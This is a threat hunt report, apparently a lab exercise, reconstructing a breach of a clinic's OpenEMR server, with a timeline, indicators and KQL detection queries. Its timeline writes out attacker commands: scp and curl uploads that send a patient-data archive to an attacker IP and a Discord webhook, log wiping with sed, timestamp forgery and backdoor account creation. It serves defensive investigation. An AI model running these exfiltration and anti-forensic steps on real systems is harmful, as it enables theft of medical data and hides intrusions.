> **Classification:** `TLP:RED — CONFIDENTIAL`
> **Report ID:** `IR-2026-007`
> **Analyst:** `T2 // Michael Kirby`
> **Date:** `2026-06-13`
> **Version:** `1.0`

---

# 🛡️ Threat Hunt Report — Rocky Clinic OpenEMR Breach

---

## 📌 Executive Summary

A threat actor gained unauthorized access to the Rocky Clinic OpenEMR electronic medical records system hosted on `rocky83`, a RockyLinux server running OpenEMR inside Docker containers. The attacker performed SSH brute-force reconnaissance, escalated privileges to root, harvested database credentials, hijacked legitimate operational scripts for staging, established persistent command-and-control via a systemd service unit, and exfiltrated a compressed archive sourced from the OpenEMR document export directory to a Discord webhook — effectively bypassing network egress controls. The exact contents of the exfiltrated archive were not directly inspected during this hunt, but the source directory (`/var/log/openemr/doc_exports/`) and the harvested MariaDB credentials indicate a high likelihood that patient-related data was at risk of unauthorized disclosure. The attacker then performed selective log tampering and timestamp forgery to obscure the timeline of their activity.

### 🔑 Key Findings at a Glance

| Category | Detail |
|----------|--------|
| 🔴 **Risk Rating** | `CRITICAL` |
| ⏱️ **Attacker Dwell Time** | `~8 days (2026-02-05 to 2026-02-13)` |
| 🖥️ **Systems Compromised** | `1 — rocky83.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net` |
| 👤 **Users Affected** | `it.admin (compromised), system (backdoor), svc.monitor, svc.integration, svc.backup, helpdesk.tier2, it.patch, it.infra, r0ckyyy335` |
| 📦 **Data Exfiltrated** | `integration_state_2026-02-10_22-00-01.tar.gz — OpenEMR document exports from /var/log/openemr/doc_exports/` |
| 🔑 **Credentials Exposed** | `DB_PASS from /etc/openemr/audit_export.env; root password reset by attacker` |
| 🌐 **Exfil Destination** | `Discord webhook (discord.com) — Cloudflare IP 162.159.135.232:443` |
| 🕵️ **Attacker Infrastructure** | `C2: 20.62.27.80; Attacker handle: streetrack` |
| 📋 **Breach Notification Required** | `LIKELY — Archive sourced from OpenEMR doc_exports directory; contents not directly inspected, assessment required` |

---

## 🎯 Hunt Objectives

- Identify malicious activity across endpoints and network telemetry
- Reconstruct the full attack chain from initial access to exfiltration
- Correlate attacker behavior to MITRE ATT&CK techniques
- Determine the full scope of compromise for breach notification
- Document evidence, detection gaps, and remediation requirements

---

## 🧭 Scope & Environment

| Field | Detail |
|-------|--------|
| **Platform** | `Microsoft Sentinel / Microsoft Defender for Endpoint` |
| **Tables Used** | `DeviceFileEvents, DeviceProcessEvents, DeviceLogonEvents, DeviceNetworkEvents, DeviceInfo, SecurityAlert` |
| **Organization** | `Rocky Clinic` |
| **Application** | `OpenEMR on Docker — cloud-hosted EHR platform` |
| **Hosts In Scope** | `rocky83.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net` |
| **Data Sources** | `Microsoft Sentinel — MDE telemetry (process, file, logon, network events)` |
| **Investigation Window** | `2026-02-04 00:00 UTC → 2026-02-14 00:00 UTC` |
| **Hunt Triggered By** | `Rocky Clinic IR — post-incident reconstruction // Hunt 07` |
| **Analyst** | `T2 // Michael Kirby` |

---

## 📚 Table of Contents

- [📌 Executive Summary](#-executive-summary)
- [🎯 Hunt Objectives](#-hunt-objectives)
- [🧭 Scope & Environment](#-scope--environment)
- [🧠 Hunt Overview](#-hunt-overview)
- [⏱️ Attack Timeline](#️-attack-timeline)
- [👤 Attacker Profile](#-attacker-profile)
- [🔴 IOC Summary](#-ioc-summary)
- [🧬 MITRE ATT&CK Summary](#-mitre-attck-summary)
- [🔍 Flag Analysis](#-flag-analysis)
- [🚨 Detection Gaps & Recommendations](#-detection-gaps--recommendations)
- [🛠️ Remediation & Containment Checklist](#️-remediation--containment-checklist)
- [🧾 Final Assessment](#-final-assessment)
- [📎 Analyst Notes](#-analyst-notes)

---

## 🧠 Hunt Overview

The attacker initially targeted rocky83 via SSH brute force from external IP `37.19.221.234`, eventually authenticating as `it.admin`. Following initial access, they conducted systematic reconnaissance — profiling the OS, querying running Docker containers, and mapping the OpenEMR application stack. Credential harvesting from `/etc/openemr/audit_export.env` gave the attacker the MariaDB password, while Docker volume enumeration confirmed the physical location of persistent database storage at `/var/lib/docker/volumes/r0ckyyy335_mariadb_data/_data`.

The attacker then pivoted to staging operations — hijacking three legitimate operational scripts under `/opt/` using `tee` and `vim`, creating multiple backdoor accounts including one named `system` designed to blend into logon telemetry, and installing a systemd service unit (`integration-monitor.service`) that spawned a Python reverse shell back to `20.62.27.80:443`. Archives of OpenEMR document exports were scheduled via cron and written to `/var/lib/integrations/` — a path crafted to look like legitimate system storage.

Exfiltration was attempted first via sftp (blocked by network controls), then via `scp` (partially successful), and finally succeeded via a Discord webhook using `curl`, uploading `integration_state_2026-02-10_22-00-01.tar.gz` to the attacker's webhook endpoint over HTTPS to Cloudflare infrastructure at `162.159.135.232:443`. Before concluding, the attacker performed selective log cleanup using `sed -i` across `/var/log/secure` and `/var/log/messages`, and forged the `/var/log/messages` modification timestamp to `2026-02-06 12:00:00` to blur causality. MDE raised a `Suspicious timestamp modification` alert (T1070, T1070.006) approximately 10 minutes after the backdating command.

---

## ⏱️ Attack Timeline

| Timestamp (UTC) | Host | Action | MITRE Technique |
|----------------|------|--------|----------------|
| 2026-02-05 00:24:45 | rocky83 | Attacker account `r0ckyyy335` runs `sudo passwd root` — root password reset | T1098 |
| 2026-02-06 16:52:13 | rocky83 | `r0ckyyy335` creates `it.admin` account via `useradd -m it.admin` | T1136.001 |
| 2026-02-06 16:54:40 | rocky83 | `r0ckyyy335` creates `it.patch` system account | T1136.001 |
| 2026-02-07 01:02:17 | rocky83 | `it.admin` creates `helpdesk.tier2` account | T1136.001 |
| 2026-02-07 02:00:19 | rocky83 | `it.admin` creates `svc.monitor` system account | T1136.001 |
| 2026-02-07 02:06:04 | rocky83 | `tee /opt/monitoring/scripts/health_snapshot.sh` — script hijack | T1543.002 |
| 2026-02-07 02:11:23 | rocky83 | `it.admin` creates `svc.integration` system account | T1136.001 |
| 2026-02-07 02:11:23 | rocky83 | `tee /opt/integrations/scripts/integration_heartbeat.sh` — script hijack | T1543.002 |
| 2026-02-07 01:52:21 | rocky83 | `tee /opt/backup/scripts/backup_manifest.sh` — first script hijack | T1543.002 |
| 2026-02-08 16:25:00 | rocky83 | SSH logon from `37.19.221.234` as `it.admin` | T1078 |
| 2026-02-08 16:25:30 | rocky83 | Operator runs `w` — first interactive recon command (ProcessId 17507) | T1033 |
| 2026-02-08 16:25:xx | rocky83 | OS fingerprinting via `cat /etc/os-release /etc/redhat-release /etc/rocky-release /etc/system-release` | T1082 |
| 2026-02-09 17:03:05 | rocky83 | `sudo -i` — privilege escalation to root | T1548.003 |
| 2026-02-09 17:03:14 | rocky83 | `docker inspect openemr-mariadb` — container interrogation | T1613 |
| 2026-02-09 17:03:14 | rocky83 | `find /var/lib/docker/volumes -maxdepth 3 -type f` — volume enumeration | T1083 |
| 2026-02-09 17:03:14 | rocky83 | `ls -l` across all Docker `_data` volume paths — physical storage mapping | T1083 |
| 2026-02-09 20:12:08 | rocky83 | Fake utilities `check_disk`, `net_monitor`, `proc_count`, `mem_check` dropped into `/usr/local/bin` | T1036.005 |
| 2026-02-09 17:30:35 | rocky83 | `vipw` used to create backdoor account `system` directly in `/etc/passwd` | T1136.001 |
| 2026-02-10 05:03:xx | rocky83 | `cat /etc/openemr/audit_export.env` — DB_PASS credential harvested | T1552.001 |
| 2026-02-10 06:04:xx | rocky83 | `find /var/lib/docker/volumes/r0ckyyy335_openemr_sites/_data/default -type f` — document file enumeration | T1083 |
| 2026-02-10 17:07:16 | rocky83 | `cat > integration-monitor.service` — initial service file creation | T1543.002 |
| 2026-02-10 22:00:00 | rocky83 | Cron fires — `tar -czf /var/lib/integrations/integration_state_2026-02-10_22-00-01.tar.gz` | T1560.001 |
| 2026-02-10 18:30:55 | rocky83 | `bash -x /usr/local/bin/openemr_audit_export.sh` — audit export script recon | T1059.004 |
| 2026-02-11 04:02:05 | rocky83 | `usermod -aG adm svc.integration/svc.backup/svc.monitor` — group privilege assignment | T1098 |
| 2026-02-11 04:16:01 | rocky83 | `vim` edits `integration-monitor.service` — service file armed (SHA256: `f71ea834...`) | T1543.002 |
| 2026-02-11 04:16:15 | rocky83 | `sudo systemctl enable integration-monitor` — service activated | T1543.002 |
| 2026-02-11 04:18:21 | rocky83 | Python reverse shell spawned (ProcessId 7999) → `/bin/sh -i` interactive session (ProcessId 8000) | T1059.004 |
| 2026-02-11 04:20:28 | rocky83 | `scp integration_state_2026-02-10_22-00-01.tar.gz streetrack@20.62.27.80:/home/streetrack/` | T1048 |
| 2026-02-11 04:22:39 | rocky83 | sftp connection to `20.62.27.80:22` — `ConnectionFailed` (blocked by network controls) | T1048 |
| 2026-02-11 04:37:22 | rocky83 | `scp -v integration_state_...tar.gz streetrack@20.62.27.80:/tmp` — retry attempt | T1048 |
| 2026-02-11 16:07:09 | rocky83 | Final `vim` edit to `integration-monitor.service` (SHA256: `32890db5...`) | T1543.002 |
| 2026-02-11 16:13:00 | rocky83 | `sed -i` selective deletion across `/var/log/secure` and `/var/log/messages` — 12 distinct operations | T1070.003 |
| 2026-02-11 16:16:47 | rocky83 | `touch -d "2026-02-06 12:00:00" /var/log/messages` — timestamp forgery | T1070.006 |
| 2026-02-11 16:26:06 | rocky83 | MDE alert: `Suspicious timestamp modification` — T1070, T1070.006 | — |
| 2026-02-13 20:10:51 | rocky83 | `curl -F file=@integration_state_...tar.gz https://discord.com/api/webhooks/...` — successful exfiltration via Discord | T1567.002 |

---

## 👤 Attacker Profile

| Attribute | Detail |
|-----------|--------|
| **Attacker Handle / ID** | `streetrack` (SSH destination username on C2 server) |
| **C2 Infrastructure** | `20.62.27.80` (ports 22, 443, 5555) |
| **Initial Access IP** | `37.19.221.234` |
| **Exfil Platform** | `Discord webhook — discord.com/api/webhooks/REDACTED/REDACTED` |
| **Tools Used** | `python3 reverse shell, nc, scp, curl, vipw, tee, sed, touch, tar, systemctl` |
| **TTPs** | `SSH brute force, sudo privilege escalation, Docker container enumeration, systemd persistence, cron-based staging, Discord webhook exfiltration, log tampering, timestamp forgery` |
| **Targeting** | `Targeted — focused specifically on OpenEMR healthcare data` |
| **Sophistication Level** | `Medium-High — used living-off-the-land binaries throughout, avoided standard detection paths, used legitimate SaaS for exfil` |
| **Credential OPSEC Failures** | `Attacker handle "streetrack" exposed in scp command line; Discord webhook URL exposed in curl command line` |

### 🔍 OPSEC Mistakes Observed
- Attacker username `streetrack` passed in plaintext in `scp` command line — visible in MDE process telemetry
- Full Discord webhook URL exposed in `curl` command line — webhook can be burned
- `vipw` used to create `system` account — detected via `/etc/passwd` file write telemetry despite log cleanup
- `sed -i` log cleanup commands themselves logged in MDE process telemetry before deletion took effect
- `useradd` entries deleted from `/var/log/secure` but MDE DeviceProcessEvents retained the evidence independently

---

## 🔴 IOC Summary

### 🌐 Network Indicators

| Type | Indicator | Context | Action |
|------|-----------|---------|--------|
| IP | `37.19.221.234` | SSH brute force source / initial access | `BLOCK` |
| IP | `20.62.27.80` | C2 server — Python reverse shell, nc, scp exfil destination | `BLOCK` |
| IP | `162.159.135.232` | Discord CDN — exfiltration destination (Cloudflare) | `MONITOR` |
| URL | `https://discord.com/api/webhooks/REDACTED/REDACTED` | Discord webhook used for exfiltration | `BURN / BLOCK` |

### 📁 File Indicators

| Type | Indicator | Location | Hash (SHA256) |
|------|-----------|----------|--------------|
| Service Unit | `integration-monitor.service` | `/etc/systemd/system/` | `f71ea834a9be9fb0e90c7b496e5312072fffedf1d1c0377957e05714bdac37b8` (armed version) |
| Service Unit | `integration-monitor.service` | `/etc/systemd/system/` | `3a9ed2177221f877bb3877e72a6a8bcdfbf23aa1647467c76bb11fc6a8f17f57` (initial) |
| Service Unit | `integration-monitor.service` | `/etc/systemd/system/` | `32890db562a1280cca0ddf9231520383842a73425d8cec9028d018a6579685d6` (post-C2 edit) |
| Archive | `integration_state_2026-02-10_22-00-01.tar.gz` | `/var/lib/integrations/` | — |
| Script | `backup_manifest.sh` | `/opt/backup/scripts/` | — |
| Script | `health_snapshot.sh` | `/opt/monitoring/scripts/` | — |
| Script | `integration_heartbeat.sh` | `/opt/integrations/scripts/` | — |
| Binary (fake) | `check_disk` | `/usr/local/bin/` | — |
| Binary (fake) | `net_monitor` | `/usr/local/bin/` | — |
| Binary (fake) | `proc_count` | `/usr/local/bin/` | — |
| Binary (fake) | `mem_check` | `/usr/local/bin/` | — |

### 👤 Account Indicators

| Account | Type | Action Required |
|---------|------|----------------|
| `system` | Backdoor account — created via `vipw` to evade detection | `Delete immediately` |
| `it.admin` | Attacker-created admin account | `Delete immediately` |
| `r0ckyyy335` | Attacker persona account with sudo access | `Delete immediately` |
| `svc.monitor` | Backdoor service account — added to `adm` group | `Delete immediately` |
| `svc.integration` | Backdoor service account — added to `adm` group | `Delete immediately` |
| `svc.backup` | Backdoor service account — added to `adm` group | `Delete immediately` |
| `helpdesk.tier2` | Attacker-created account | `Delete immediately` |
| `it.patch` | Attacker-created system account | `Delete immediately` |
| `it.infra` | Attacker-created account | `Delete immediately` |

### 🔑 Credential Exposure

| Credential | Where Found | Reset Required |
|------------|-------------|---------------|
| `DB_PASS` (MariaDB) | `/etc/openemr/audit_export.env` — read by attacker via `cat` | `YES — IMMEDIATE` |
| `root` password | Reset by `r0ckyyy335` via `sudo passwd root` on 2026-02-05 | `YES — IMMEDIATE` |

---

## 🧬 MITRE ATT&CK Summary

| # | Flag Name | Tactic | Technique ID | Technique Name | Priority |
|--:|-----------|--------|-------------|----------------|----------|
| 1 | OpenEMR Device Discovery | Discovery | T1083 | File and Directory Discovery | 🟡 Medium |
| 2 | OpenEMR Container Runtime | Discovery | T1613 | Container and Resource Discovery | 🟡 Medium |
| 3 | First Behavioural Tell | Discovery | T1033 | System Owner/User Discovery | 🟡 Medium |
| 4 | Session Boundary Fingerprint | Discovery | T1083 | File and Directory Discovery | 🟡 Medium |
| 5 | Account Name Attribution | Initial Access | T1078 | Valid Accounts | 🔴 Critical |
| 6 | Environment Confirmation | Discovery | T1082 | System Information Discovery | 🟡 Medium |
| 7 | Platform Reality Check | Discovery | T1082 | System Information Discovery | 🟡 Medium |
| 8 | Crossing the Trust Line | Privilege Escalation | T1548.003 | Abuse Elevation Control: Sudo and Sudo Caching | 🟠 High |
| 9 | Runtime Layer Interrogation | Discovery | T1613 | Container and Resource Discovery | 🟡 Medium |
| 10 | The Single File That Explains Everything | Credential Access | T1552.001 | Unsecured Credentials: Credentials in Files | 🔴 Critical |
| 11 | Physical Mapping Confirmation | Discovery | T1083 | File and Directory Discovery | 🟡 Medium |
| 12 | Where the Data Actually Lives | Discovery | T1083 | File and Directory Discovery | 🟡 Medium |
| 13 | Hijacking a Trusted Repeating Path | Persistence | T1543.002 | Create or Modify System Process | 🟠 High |
| 14 | Staging Prep Directory | Collection | T1560.001 | Archive Collected Data: Archive via Utility | 🟠 High |
| 15 | The Unauthorised Account | Persistence | T1136.001 | Create Account: Local Account | 🔴 Critical |
| 16 | Binary Used to Create the Identity | Defense Evasion | T1036 | Masquerading | 🟠 High |
| 17 | Persistence Artifact | Persistence | T1543.002 | Create or Modify System Process: Systemd Service | 🔴 Critical |
| 18 | Binary Used to Create Persistence Artifact | Defense Evasion | T1036 | Masquerading | 🟡 Medium |
| 19 | SHA256 of Armed Service File | Persistence | T1543.002 | Create or Modify System Process: Systemd Service | 🔴 Critical |
| 20 | C2 One-Liner | Command and Control | T1059.004 | Command and Scripting Interpreter: Unix Shell | 🔴 Critical |
| 21 | Reverse Shell Process Identification | Command and Control | T1059.004 | Command and Scripting Interpreter: Unix Shell | 🔴 Critical |
| 22 | Staged Archive Identification | Exfiltration | T1560.001 | Archive Collected Data: Archive via Utility | 🟠 High |
| 23 | First Exfiltration Attempt | Exfiltration | T1048 | Exfiltration Over Alternative Protocol | 🟠 High |
| 24 | Successful Exfiltration Pivot | Exfiltration | T1567.002 | Exfiltration Over Web Service: Exfiltration to Cloud Storage | 🔴 Critical |
| 25 | Exfiltration IP and Port | Exfiltration | T1567.002 | Exfiltration Over Web Service | 🔴 Critical |
| 26 | Selective Log Cleanup | Defense Evasion | T1070.003 | Indicator Removal: Clear Linux or Mac System Logs | 🟠 High |
| 27 | Log Manipulation Binary | Defense Evasion | T1070.003 | Indicator Removal: Clear Linux or Mac System Logs | 🟠 High |
| 28 | Timeline Distortion | Defense Evasion | T1070.006 | Indicator Removal: Timestomp | 🟠 High |
| 29 | Cleanup Alert Classification | Defense Evasion | T1070, T1070.006 | Indicator Removal / Timestomp | 🟠 High |

---

## 🔍 Flag Analysis

---

<details>
<summary>🚩 <strong>Flag 01: OpenEMR Device Discovery</strong> — <code>T1083</code> — 🟡 Medium</summary>

### 🎯 Objective
Identify which device in the Rocky Clinic environment hosts the OpenEMR application.

### 📌 Finding
FileDeleted events with `/var/backups/openemr/` in the FolderPath confirmed the OpenEMR host.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `rocky83.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net` |
| **Table** | `DeviceFileEvents` |
| **ActionType** | `FileDeleted` |
| **FolderPath** | `/var/backups/openemr/` |

### 💡 Why It Matters
Identifies the primary target device for the entire investigation — all subsequent analysis scoped to this host.

### 🔗 Attack Chain Position
Starting point — asset validation before hunting begins.

### 🔧 KQL Query Used

```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where * has "openemr"
| project ActionType, DeviceName, FileName, FolderPath
| take 10
```

### 🛡️ Detection Recommendation
**Hunting Tip:** `* has "value"` is a full-row string search in KQL — useful early in a hunt when the target field is unknown. Use it to cast a wide net, then narrow based on what surfaces.

**MITRE Reference:** [T1083](https://attack.mitre.org/techniques/T1083)

</details>

---

<details>
<summary>🚩 <strong>Flag 02: OpenEMR Container Runtime</strong> — <code>T1613</code> — 🟡 Medium</summary>

### 🎯 Objective
Identify the container runtime used to run OpenEMR on rocky83.

### 📌 Finding
`InitiatingProcessCommandLine` in DeviceFileEvents referenced Docker, confirming the container runtime.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `rocky83` |
| **Runtime** | `Docker` |
| **Field** | `InitiatingProcessCommandLine` |

### 💡 Why It Matters
Confirms OpenEMR and MariaDB run inside Docker containers — critical context for all subsequent volume and credential discovery steps.

### 🔗 Attack Chain Position
Follows device discovery — establishes the application architecture before credential and data hunting.

### 🔧 KQL Query Used

```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where * has "openemr"
| project TimeGenerated, ActionType, DeviceName, FileName, FolderPath, InitiatingProcessCommandLine
| sort by TimeGenerated desc
```

### 🛡️ Detection Recommendation
**Hunting Tip:** `InitiatingProcessCommandLine` is one of the most revealing fields in MDE — it exposes the full execution context of what triggered a file event, often revealing runtimes, interpreters, or parent processes.

**MITRE Reference:** [T1613](https://attack.mitre.org/techniques/T1613)

</details>

---

<details>
<summary>🚩 <strong>Flag 03: First Behavioural Tell</strong> — <code>T1033</code> — 🟡 Medium</summary>

### 🎯 Objective
Identify the ProcessId of the first interactive recon command run by the attacker after SSH authentication.

### 📌 Finding
After scoping the suspicious SSH session (POSIX session 17334 → bash 17364), the first command run was `w` at 2026-02-08 16:25:30 UTC with ProcessId 17507.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `rocky83` |
| **Timestamp** | `2026-02-08 16:25:30 UTC` |
| **Account** | `it.admin` |
| **Command** | `w` |
| **ProcessId** | `17507` |
| **SSH Source IP** | `37.19.221.234` |
| **POSIX Session** | `sshd: 17334 → bash: 17364` |

### 💡 Why It Matters
`w` is a classic first-recon command — it shows who is logged in and what they're running. Running it immediately after authentication is a strong indicator of interactive attacker activity rather than automated tooling.

### 🔗 Attack Chain Position
First interactive command following SSH initial access — begins the recon phase.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName contains "rocky83"
| where AccountName == "it.admin"
| where InitiatingProcessParentId == 17364
| where FileName in ("w", "who", "users")
| project TimeGenerated, ProcessId, FileName
| sort by TimeGenerated asc
```

### 🛡️ Detection Recommendation
**Hunting Tip:** On Linux endpoints in MDE, trace the POSIX session chain by parsing `ProcessPosixSessionId` from `AdditionalFields` using `parse_json()`. sshd and bash carry different session IDs — matching `InitiatingProcessParentId` to the bash session ID scopes exactly one terminal session.

**MITRE Reference:** [T1033](https://attack.mitre.org/techniques/T1033)

</details>

---

<details>
<summary>🚩 <strong>Flag 04: Session Boundary Fingerprint</strong> — <code>T1083</code> — 🟡 Medium</summary>

### 🎯 Objective
Identify the SHA256 of the last binary executed in the suspicious SSH session.

### 📌 Finding
The last interactive command in the session was `sudo docker ps`. The SHA256 belongs to the `docker` binary, not `sudo`.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `rocky83` |
| **Account** | `it.admin` |
| **Last Command** | `sudo docker ps` |
| **Binary** | `docker` |
| **SHA256** | `a7b78ff3f501951cd8455697ef1b6dc1832ae42a9433...` |

### 💡 Why It Matters
The attacker's final action in this session was inspecting running Docker containers — confirming they understood the application architecture and were preparing for deeper access.

### 🔗 Attack Chain Position
Closes out the initial reconnaissance session — the Docker query confirms the attacker's awareness of the container environment.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName contains "rocky83"
| where AccountName == "it.admin"
| where InitiatingProcessParentId == 17364
| project TimeGenerated, FileName, ProcessCommandLine, SHA256
| sort by TimeGenerated desc
```

### 🛡️ Detection Recommendation
**Hunting Tip:** When the last command is `sudo <binary>`, the SHA256 you want is on the child process (the actual binary), not the sudo wrapper. Always check `FileName` alongside `SHA256` to ensure you're grabbing the right process.

**MITRE Reference:** [T1083](https://attack.mitre.org/techniques/T1083)

</details>

---

<details>
<summary>🚩 <strong>Flag 05: Account Name Attribution</strong> — <code>T1078</code> — 🔴 Critical</summary>

### 🎯 Objective
Identify the account name used in the suspicious SSH session.

### 📌 Finding
All suspicious Network logons (excluding known admin IP `68.53.47.150`) were under `it.admin`.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `rocky83` |
| **Account** | `it.admin` |
| **LogonType** | `Network` |
| **Known Admin IP** | `68.53.47.150` (27 connections — legitimate) |
| **Attacker IP** | `37.19.221.234` |

### 💡 Why It Matters
`it.admin` is the primary attacker-controlled account used throughout the intrusion. Identifying it early anchors all subsequent investigation.

### 🔗 Attack Chain Position
Establishes the primary attacker account — used as a filter anchor for the rest of the hunt.

### 🔧 KQL Query Used

```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName contains "rocky83"
| where AccountName == "it.admin"
| where LogonType == "Network"
| where RemoteIP != "68.53.47.150"
| project TimeGenerated, AccountName
| sort by TimeGenerated asc
```

### 🛡️ Detection Recommendation
**Hunting Tip:** Baseline legitimate admin IPs first using `summarize count() by RemoteIP` — high-frequency IPs are routine, single-occurrence IPs are candidates for investigation.

**MITRE Reference:** [T1078](https://attack.mitre.org/techniques/T1078)

</details>

---

<details>
<summary>🚩 <strong>Flag 06: Environment Confirmation</strong> — <code>T1082</code> — 🟡 Medium</summary>

### 🎯 Objective
Identify the OS fingerprinting command and how many files it targeted.

### 📌 Finding
The attacker ran `cat /etc/os-release /etc/redhat-release /etc/rocky-release /etc/system-release` — reading 4 release files in a single command.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `rocky83` |
| **Account** | `it.admin` |
| **Command** | `cat /etc/os-release /etc/redhat-release /etc/rocky-release /etc/system-release` |
| **Files Targeted** | `4` |

### 💡 Why It Matters
OS fingerprinting via release files confirms the attacker was profiling the system for targeted exploitation — understanding the exact Linux distribution informs which tools and techniques will work.

### 🔗 Attack Chain Position
Early recon — establishes OS context before privilege escalation and container enumeration.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName contains "rocky83"
| where AccountName == "it.admin"
| where ProcessCommandLine contains "release"
| project TimeGenerated, ProcessCommandLine, FileName, InitiatingProcessParentId
```

### 🛡️ Detection Recommendation
**Hunting Tip:** On Linux, file reads don't appear in DeviceFileEvents — they surface in DeviceProcessEvents via `ProcessCommandLine`. Filter for reading binaries (`cat`, `grep`, etc.) combined with target file patterns to surface recon activity.

**MITRE Reference:** [T1082](https://attack.mitre.org/techniques/T1082)

</details>

---

<details>
<summary>🚩 <strong>Flag 07: Platform Reality Check</strong> — <code>T1082</code> — 🟡 Medium</summary>

### 🎯 Objective
Confirm the OS distribution as recorded by the EDR.

### 📌 Finding
DeviceInfo `OSDistribution` field returned `RockyLinux`.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `rocky83` |
| **OSDistribution** | `RockyLinux` |
| **Table** | `DeviceInfo` |

### 💡 Why It Matters
Cross-references attacker recon findings against EDR inventory — confirms the environment matches what the attacker was targeting.

### 🔧 KQL Query Used

```kql
DeviceInfo
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName contains "rocky83"
```

### 🛡️ Detection Recommendation
**Hunting Tip:** `DeviceInfo` is the EDR inventory table — go here first when a flag asks "as recorded by the EDR." It stores static device metadata like OS, distribution, version, and onboarding status.

**MITRE Reference:** [T1082](https://attack.mitre.org/techniques/T1082)

</details>

---

<details>
<summary>🚩 <strong>Flag 08: Crossing the Trust Line</strong> — <code>T1548.003</code> — 🟠 High</summary>

### 🎯 Objective
Identify the privilege escalation command used to move from `it.admin` to a fully privileged root shell.

### 📌 Finding
The attacker ran `sudo -i` — spawning a fully privileged interactive root login shell.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `rocky83` |
| **Account** | `it.admin` |
| **Command** | `sudo -i` |
| **Result** | Root login shell — full privilege |

### 💡 Why It Matters
`sudo -i` is the trust boundary crossing — once the attacker has a root shell, all subsequent actions operate with full system privileges, enabling container inspection, credential access, and persistence.

### 🔗 Attack Chain Position
Pivot from constrained admin to root — enables all post-exploitation activity.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName contains "rocky83"
| where AccountName == "it.admin"
| where ProcessCommandLine has_any ("sudo su", "sudo -i", "sudo bash", "sudo sh")
| project TimeGenerated, ProcessCommandLine
```

### 🛡️ Detection Recommendation

**Alert Rule:**
```
IF ProcessCommandLine has_any ("sudo -i", "sudo su", "sudo bash", "sudo sh")
AND AccountName != expected_admin_account
THEN ALERT — HIGH
```

**MITRE Reference:** [T1548.003](https://attack.mitre.org/techniques/T1548/003)

</details>

---

<details>
<summary>🚩 <strong>Flag 09: Runtime Layer Interrogation</strong> — <code>T1613</code> — 🟡 Medium</summary>

### 🎯 Objective
Identify the command used to interrogate the database container immediately after privilege escalation.

### 📌 Finding
`docker inspect openemr-mariadb` was run 9 seconds after `sudo -i` at 2026-02-09 17:03:14 UTC as root.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `rocky83` |
| **Account** | `root` (post sudo -i) |
| **Timestamp** | `2026-02-09 17:03:14 UTC` |
| **Command** | `docker inspect openemr-mariadb` |

### 💡 Why It Matters
`docker inspect` returns the full container configuration including mount points — this is how the attacker identified where the MariaDB data volume was physically mounted on the host.

### 🔗 Attack Chain Position
First root action — transitions from privilege escalation to container/data discovery.

### 🔧 KQL Query Used

```kql
union
(
    DeviceProcessEvents
    | where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
    | where DeviceName contains "rocky83"
    | where AccountName == "it.admin"
    | where ProcessCommandLine has_any ("sudo -i")
    | project TimeGenerated, ProcessCommandLine, AccountName
),
(
    DeviceProcessEvents
    | where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
    | where DeviceName contains "rocky83"
    | where AccountName == "root"
    | where ProcessCommandLine contains "docker inspect"
    | project TimeGenerated, ProcessCommandLine, AccountName
)
| order by TimeGenerated asc
```

### 🛡️ Detection Recommendation
**Hunting Tip:** `union` combines two queries into one interleaved timeline — essential when an attacker crosses account contexts (e.g. `it.admin` → `root` via `sudo -i`) and you need to correlate activity across both without running queries separately.

**MITRE Reference:** [T1613](https://attack.mitre.org/techniques/T1613)

</details>

---

<details>
<summary>🚩 <strong>Flag 10: The Single File That Explains Everything</strong> — <code>T1552.001</code> — 🔴 Critical</summary>

### 🎯 Objective
Identify the config file read by the attacker that exposed database credentials.

### 📌 Finding
The attacker ran `cat /etc/openemr/audit_export.env` as root — a file outside the OpenEMR application directory (`/var/www`) containing `DB_PASS`.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `rocky83` |
| **Account** | `root` |
| **Command** | `cat /etc/openemr/audit_export.env` |
| **Credential Exposed** | `DB_PASS` (MariaDB password) |

### 💡 Why It Matters
The `.env` file contained the MariaDB database password — giving the attacker repeatable, stable credential access to the OpenEMR database without needing to interact with the running container.

### 🔗 Attack Chain Position
Credential harvesting — enables direct database access and anchors the staging/exfil phase.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName contains "rocky83"
| where ProcessCommandLine has_any ("cat", "grep", "less", "more", "tail", "head")
| where ProcessCommandLine contains "docker-compose.yml" or ProcessCommandLine contains ".env"
| project TimeGenerated, ProcessCommandLine, AccountName
| sort by TimeGenerated asc
```

### 🛡️ Detection Recommendation

**Alert Rule:**
```
IF ProcessCommandLine has_any ("cat", "grep") 
AND ProcessCommandLine contains ".env"
AND FolderPath not startswith "/var/www"
THEN ALERT — HIGH
```

